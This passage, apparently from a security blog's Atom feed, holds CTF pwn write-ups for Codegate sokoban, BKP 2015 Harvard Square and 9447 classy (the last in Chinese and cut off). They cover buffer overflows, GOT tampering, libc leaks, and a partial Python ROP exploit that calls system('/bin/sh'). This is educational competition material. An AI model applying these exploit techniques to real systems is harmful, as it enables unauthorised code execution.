+&lt;p&gt;Next, we opened IDA pro and reversed the binary.&lt;br&gt;
+We could easily find the code like:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if (playgame() == 1)
+    get_flag();
+puts(s);
+return;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we traced how is the return value assigned......  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;// just pseudo code
+if (win)
+  passed++;
+return (passed == 228) ? 2 : 0;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;228 is the amount of all levels.&lt;br&gt;
+It seems impossible to arrive &lt;code&gt;get_flag()&lt;/code&gt;. XD&lt;br&gt;
+But our goal is very clear, &lt;strong&gt;control the EIP and go to &lt;code&gt;get_flag()&lt;/code&gt;&lt;/strong&gt;.  &lt;/p&gt;
+&lt;p&gt;We accidentally found the game sometimes generates a blank map in random mode then checks the rule of movement, it restricts the character by the element in the map, not the size of map.&lt;br&gt;
+Therefore, once we could get the blank map, we were able to move the character to anyware in &lt;strong&gt;bss segment&lt;/strong&gt; and &lt;strong&gt;GOT segment&lt;/strong&gt;.  &lt;/p&gt;
+&lt;p&gt;There is the defination of elements:  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;\x00: nothing&lt;/li&gt;
+&lt;li&gt;\x01: destination of box&lt;/li&gt;
+&lt;li&gt;\x02: wall&lt;/li&gt;
+&lt;li&gt;other: it's not important.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;According to the rule of sokoban, we could push a byte onto &lt;code&gt;\x00&lt;/code&gt; or &lt;code&gt;\x01&lt;/code&gt;.&lt;br&gt;
+It's very difficult to use......&lt;br&gt;
+I tried to move the content of GOT at first, but I found GOT looks like:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:        0xf7ffafa0      0x00007fff      0x00400dd6      0x00000000&lt;br&gt;
+&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#119;&amp;#103;&amp;#101;&amp;#116;&amp;#99;&amp;#104;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#119;&amp;#103;&amp;#101;&amp;#116;&amp;#99;&amp;#104;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:      0xf7bc2f90      0x00007fff      0x00400df6      0x00000000&lt;br&gt;
+&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#110;&amp;#111;&amp;#101;&amp;#99;&amp;#104;&amp;#111;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#110;&amp;#111;&amp;#101;&amp;#99;&amp;#104;&amp;#111;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:      0xf7bc0a50      0x00007fff      0x00400e16      0x00000000&lt;br&gt;
+&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#119;&amp;#109;&amp;#111;&amp;#118;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#119;&amp;#109;&amp;#111;&amp;#118;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:       0xf7bc4e40      0x00007fff      0xf799de70      0x00007fff&lt;br&gt;
+&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#109;&amp;#118;&amp;#112;&amp;#114;&amp;#105;&amp;#110;&amp;#116;&amp;#119;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#109;&amp;#118;&amp;#112;&amp;#114;&amp;#105;&amp;#110;&amp;#116;&amp;#119;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:    0xf7bc7db0      0x00007fff      0xf7bc0ad0      0x00007fff  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Almost all bytes are adjacent to each other.&lt;br&gt;
+Therefore, we couldn't change the GOT area at most situation except ASLR was enable.&lt;br&gt;
+For example, it's possible to make a libc address likes &lt;strong&gt;0x7fffff00xx&lt;/strong&gt;.&lt;br&gt;
+So we could modify a byte on GOT to somewhere in libc.  &lt;/p&gt;
+&lt;p&gt;Still seem useless....&lt;br&gt;
+But after I checked all possible gadgets, I found a magic gadget at &lt;strong&gt;0x3e260&lt;/strong&gt;.&lt;br&gt;
+That is &lt;code&gt;add rsp, 0x28; (pop XX)*6; ret&lt;/code&gt;.&lt;br&gt;
+Furthermore, the address of &lt;code&gt;rand()&lt;/code&gt; is &lt;strong&gt;0x3d060&lt;/strong&gt;.&lt;br&gt;
+If we modify &lt;code&gt;rand()&lt;/code&gt; to that magic gadget, the return address is &lt;strong&gt;0x401a9a&lt;/strong&gt; after we execute &lt;code&gt;rand()&lt;/code&gt; again.&lt;br&gt;
+Luckily, there are a hidden function in the game.&lt;br&gt;
+If we press &lt;code&gt;v&lt;/code&gt;, it will add 0x12 on &lt;strong&gt;0x60c120&lt;/strong&gt;.&lt;br&gt;
+And, 0x3e260 - 0x3d060 = 0x12......  &lt;/p&gt;
+&lt;p&gt;So, hence we had already bypassed the action of assign value to &lt;code&gt;EAX&lt;/code&gt;.&lt;br&gt;
+If we could control &lt;code&gt;EAX&lt;/code&gt; and set &lt;code&gt;EAX = 1&lt;/code&gt;, we entered the function &lt;code&gt;get_flag()&lt;/code&gt;.&lt;br&gt;
+Lucklily, if the argument of wgetch is \x00, the return value will be 1.&lt;br&gt;
+On x86 architecture, the return value will be stored in &lt;code&gt;EAX&lt;/code&gt;.&lt;br&gt;
+&lt;code&gt;EAX&lt;/code&gt; won't be modified until we call &lt;code&gt;rand()&lt;/code&gt;.&lt;br&gt;
+Finally, the program will print the flag. :)  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;WH0n in OOme, ZZ as 12e RolanS&lt;/code&gt;  &lt;/p&gt;</content><category term="Codegate CTF"></category><category term="Off-by-one"></category></entry><entry><title>Boston Key Party CTF 2015 Pwn 275 Harvard Square</title><link href="https://ddaa.tw/bkpctf_pwn_275_harvard_square.html" rel="alternate"></link><published>2015-03-02T01:50:00+08:00</published><updated>2015-03-02T01:50:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-03-02:/bkpctf_pwn_275_harvard_square.html</id><summary type="html">&lt;p&gt;This problem was worth 275 pts, but I thought it is easier than other red problems. XD&lt;br&gt;
+We could reverse it happily beacuse the programe wasn't stipped.  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The problem is a game about transcation of 0days.&lt;br&gt;
+We could enter the password and cheated the game, but it's useless. XD&lt;br&gt;
+After …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This problem was worth 275 pts, but I thought it is easier than other red problems. XD&lt;br&gt;
+We could reverse it happily beacuse the programe wasn't stipped.  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The problem is a game about transcation of 0days.&lt;br&gt;
+We could enter the password and cheated the game, but it's useless. XD&lt;br&gt;
+After executing the binary, the game printed the message:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Welcome to 0day Warz - The goal of the game is to get the $100M USD by the end of the game. You have been given a loan of $2000, with some high interest rate of 25% a day!  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The program for the goal of game:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void play_game() {
+    ...
+    if (owed == 0.0) {
+        if (money &amp;gt; 9999999)
+      action_hiscore();
+    }
+  ...
+}
+void action_hiscore() {
+    char buf[268];
+  ....
+  read(0, buf, 0x400);
+  ...
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;However, if understood the game rule, we could know the condition is impossible to reach.&lt;br&gt;
+So we must find another vulunerbility.&lt;br&gt;
+In fact, there is a bof when &lt;code&gt;play_game()&lt;/code&gt; starting.&lt;br&gt;
+It couldn't overflow the return address, but we could use it to change function pointers. :D  &lt;/p&gt;
+&lt;p&gt;The program use &lt;a href="https://github.com/dhamidi/simple-gc/"&gt;simple-gc&lt;/a&gt;.&lt;br&gt;
+It will create two garbage-collectors and put function pointer &lt;code&gt;exploit_free&lt;/code&gt; and &lt;code&gt;string_free&lt;/code&gt; to gc.&lt;br&gt;
+Then, gc will trigger when we do &lt;code&gt;sleep&lt;/code&gt; action.&lt;br&gt;
+We could overwrite function ptr to &lt;code&gt;action_hiscore&lt;/code&gt;, and we could overwrite the return address.  &lt;/p&gt;
+&lt;p&gt;We could write the exploit until now.&lt;br&gt;
+Honestly, I am not familar with x64 architecture exploit.&lt;br&gt;
+I wasted a lot of time to debug my code. :(  &lt;/p&gt;
+&lt;p&gt;By the way, args on x64 is in register.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;arg1 =&amp;gt; rdi
+arg2 =&amp;gt; rsi
+arg3 =&amp;gt; rdx
+arg4 =&amp;gt; r8
+...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So we must find some gadget to control arguments at first.&lt;br&gt;
+Then, we could use &lt;code&gt;put()&lt;/code&gt; to leak arbitrary address.&lt;br&gt;
+There exist a little bug.... stdout dupped to socket.&lt;br&gt;
+We won't receive the content immediately.&lt;br&gt;
+To solve this bug, I returned to &lt;code&gt;action_hiscore()&lt;/code&gt; again because there is &lt;code&gt;fflush()&lt;/code&gt; at the end of function.  &lt;/p&gt;
+&lt;p&gt;After leaked the address, we could calulate the address of &lt;code&gt;system()&lt;/code&gt;.&lt;br&gt;
+Next, We needed a string of "/bin/sh".&lt;br&gt;
+Luckily, we could find it in libc, too. XD&lt;br&gt;
+So we couldn execute &lt;code&gt;system("/bin/sh")&lt;/code&gt; to get the shell.  &lt;/p&gt;
+&lt;p&gt;My partitial exploit:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# leak address&lt;/span&gt;
+&lt;span class="nf"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;wait gdb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name? &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;402fc3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;got&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;605061&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;400cd0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;280&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;got&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;bof&lt;/span&gt;
+&lt;span class="nf"&gt;send_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...-&amp;#39;\&amp;quot;\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# get leak and count libc&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;read_line&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nf"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s s-Atom"&gt;::-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nf"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hex&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;leak+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x54400&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x46640&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="s s-Atom"&gt;:&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;system&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;binsh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x17d87b&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="s s-Atom"&gt;:&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="c1"&gt;# get and shell out&lt;/span&gt;
+&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name? &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;605800&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s s-Atom"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;280&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;binsh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;system&lt;/span&gt;
+&lt;span class="nf"&gt;send_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="s s-Atom"&gt;t&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;interact&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;flag: &lt;code&gt;stay_in_school_and_dont_do_the_grugq&lt;/code&gt;  &lt;/p&gt;</content><category term="BKPCTF"></category><category term="Stack Overflow"></category></entry><entry><title>9447 CTF 2014 pwn 420 classy</title><link href="https://ddaa.tw/9447ctf_pwn_420_classy.html" rel="alternate"></link><published>2014-12-04T14:22:00+08:00</published><updated>2014-12-04T14:22:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-12-04:/9447ctf_pwn_420_classy.html</id><summary type="html">&lt;p&gt;這題看了十個小時多卻沒解出來&lt;br&gt;
+實在是很挫敗......&lt;br&gt;
+不過還是覺得這題該寫個 write up 紀錄&lt;br&gt;
+下次才不會一樣進入思維誤區  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是 binary 是用 C++ 寫的&lt;br&gt;
+還包含了一些 libary function&lt;br&gt;
+程式規模非常大 要每個 function 都看過不太可能  &lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt; 非常簡單&lt;br&gt;
+進行 io redirect 和一些參數的檢查&lt;br&gt;
+接著就進入兩個關鍵的 function&lt;br&gt;
+&lt;code&gt;parse_file_or_die()&lt;/code&gt; 以及 &lt;code&gt;gogo()&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;這兩個 function 都十分複雜&lt;br&gt;
+而且又用了不少動態跳躍&lt;br&gt;
+即使用 ida pro 翻成 pseudo code 也不完整&lt;br&gt;
+很難完全看懂&lt;br&gt;
+用動態分析其行為得到結果是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;parse_file_or_die()&lt;/code&gt;
+    讀入一個 java class，如果格式有誤或者使用了不允許的動作都會發生 exception 並結束 …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;這題看了十個小時多卻沒解出來&lt;br&gt;
+實在是很挫敗......&lt;br&gt;
+不過還是覺得這題該寫個 write up 紀錄&lt;br&gt;
+下次才不會一樣進入思維誤區  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是 binary 是用 C++ 寫的&lt;br&gt;
+還包含了一些 libary function&lt;br&gt;
+程式規模非常大 要每個 function 都看過不太可能  &lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt; 非常簡單&lt;br&gt;
+進行 io redirect 和一些參數的檢查&lt;br&gt;
+接著就進入兩個關鍵的 function&lt;br&gt;
+&lt;code&gt;parse_file_or_die()&lt;/code&gt; 以及 &lt;code&gt;gogo()&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;這兩個 function 都十分複雜&lt;br&gt;
+而且又用了不少動態跳躍&lt;br&gt;
+即使用 ida pro 翻成 pseudo code 也不完整&lt;br&gt;
+很難完全看懂&lt;br&gt;
+用動態分析其行為得到結果是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;parse_file_or_die()&lt;/code&gt;
+    讀入一個 java class，如果格式有誤或者使用了不允許的動作都會發生 exception 並結束&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;gogo()&lt;/code&gt;
+    逐步執行 bytecode，如果使用沒有實作的指令或是使用 mnemonic 有問題，就跳出 exception 並結束&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以這題是個 java emulator&lt;br&gt;
+一開始以為這題是 jailbreak 的類型&lt;br&gt;
+一直在想辦法繞過 &lt;code&gt;parse_file_or_die()&lt;/code&gt; 的限制去讀 flag&lt;br&gt;
+但是這個方向顯然是錯的&lt;br&gt;
+直到官方放出了 &lt;code&gt;libc-2.19.so&lt;/code&gt; 才把方向轉為尋找漏洞...&lt;br&gt;
+這邊犯下了第一個錯誤－－太執著於靜態分析&lt;br&gt;
+花了很多時間在看 &lt;code&gt;parse_file_or_die()&lt;/code&gt;&lt;br&gt;
+直到 Lays 發現寫 bytecode 使用數個 &lt;code&gt;ldc&lt;/code&gt; 會導致程式 smash tht stack&lt;br&gt;
+才確定 vuln 在 &lt;code&gt;gogo()&lt;/code&gt; =__=  &lt;/p&gt;
+&lt;p&gt;有了 crash 點就很輕易能找出程式是哪裡出問題 (fault localization?)&lt;br&gt;
+逐步追蹤可以找到 crash 的原因在呼叫 &lt;code&gt;Stack::push()&lt;/code&gt; 會 overflow&lt;br&gt;
+後來又發現 istore 算好 offset 可以改到 eip 的 value&lt;br&gt;
+但由於一次寫入會是 16 byte (tag + value)&lt;br&gt;
+tag 值無法控制...也就是說無法控制連續的 stack&lt;br&gt;
+只能做一次 return&lt;br&gt;
+沒有辦法成功構造出 rop 去 leak information 再跳到 system&lt;br&gt;
+嘗試找 gadget 來解決 stack layout 的問題&lt;br&gt;
+經過三小時的嘗試後宣告這方向似乎是錯的....&lt;br&gt;
+開始把方向轉到尋找可用的 bytecode&lt;br&gt;
+但是時間已經不夠了 Q__Q  &lt;/p&gt;
+&lt;p&gt;後來花點時間把程式完全看懂&lt;br&gt;
+這題的問題是這樣子的.....&lt;br&gt;
+(後面 &lt;strong&gt;小寫 stack&lt;/strong&gt; 表示 elf 的 stack、&lt;strong&gt;大寫 Stack&lt;/strong&gt; 表示 jvm 模擬的 stack)  &lt;/p&gt;
+&lt;p&gt;這題在初始化 jvm 的環境後&lt;br&gt;
+將一些參數 push 進 Stack&lt;br&gt;
+就開始執行 java main function 的 bytecode&lt;br&gt;
+接著可以使用 bytecode 操作 Stack 的指令去控制 stack&lt;br&gt;
+這題的 Stack 並不是使用 C++ 的 standard library 寫的&lt;br&gt;
+而是出題者自已寫的 Stack 物件&lt;br&gt;
+導致可以 overflow 以及修改 stack 的內容&lt;br&gt;
+push 的單位是一個 &lt;code&gt;StackItem&lt;/code&gt; = 16 byte&lt;br&gt;
+但也造成前面提到的不能連續控制記憶體的問題  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;struct StackItem
+{
+    int tag;
+    int value;
+};
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ldc [value or str]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sipush [value]&lt;/code&gt;&lt;br&gt;
+    兩個指令類似，在 Stack push StackItem&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;istore [offset]&lt;/code&gt;
+    在 Stack + offset 的位置寫 StackItem&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;iload [offset]&lt;/code&gt;
+    在 Stack + offset 的位置 pop StackItem，檢查 StackItem.tag 的值是不是 0x2f，如果是就 push 進 Stack&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;理論上 &lt;code&gt;iload&lt;/code&gt; 做 &lt;code&gt;0x2f&lt;/code&gt; 的檢查以後沒辦法任意讀取記憶體內容&lt;br&gt;
+但是這邊其實是有問題的&lt;br&gt;
+原因是 Stack 的內容並沒有對齊 16 byte  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mh"&gt;0xffffd020&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000005e&lt;/span&gt;      &lt;span class="mh"&gt;0x08065188&lt;/span&gt;      &lt;span class="mh"&gt;0xffffd034&lt;/span&gt;      &lt;span class="mh"&gt;0x0805305c&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd030&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x080650f8&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd040&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd050&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd060&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0eceea00&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;--&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt; &lt;span class="n"&gt;guard&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd070&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0xffffd080&lt;/span&gt;      &lt;span class="mh"&gt;0x00000000&lt;/span&gt;      &lt;span class="mh"&gt;0xffffd128&lt;/span&gt;      &lt;span class="mh"&gt;0x08054180&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;ldc 0x2f&lt;/code&gt; push 大量的 0x2f 進入 Stack&lt;br&gt;
+&lt;code&gt;iload&lt;/code&gt; 是按照 &lt;code&gt;[Stack + offset\*8]&lt;/code&gt; 的方式去存取 Stack&lt;br&gt;
+如果把 push 的內容就是 0x2f 就可以 bypass &lt;code&gt;iload&lt;/code&gt; 的 檢查&lt;br&gt;
+因此我們可以順利得到 stack 上的內容&lt;br&gt;
+以此例來說，&lt;code&gt;iload&lt;/code&gt; 得到的結果是 stack guard&lt;br&gt;
+用同樣的方式可以得到出 &lt;code&gt;libc&lt;/code&gt; 的位置  &lt;/p&gt;
+&lt;p&gt;嚴格來說，這樣並沒有成功 leak memory&lt;br&gt;
+因為不會 print 出來，我們也沒辦法再接 io&lt;br&gt;
+但是這題也不需要&lt;br&gt;
+用 &lt;code&gt;iload&lt;/code&gt; 得到 libc 以後可以直接用 bytecode 提供的指令做運算&lt;br&gt;
+算出 &lt;code&gt;system&lt;/code&gt; 的位置，再用 &lt;code&gt;istore&lt;/code&gt; 重新寫回 stack  &lt;/p&gt;
+&lt;p&gt;總結這題的做法如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;iload&lt;/code&gt; 得到 stack guard  &lt;/li&gt;
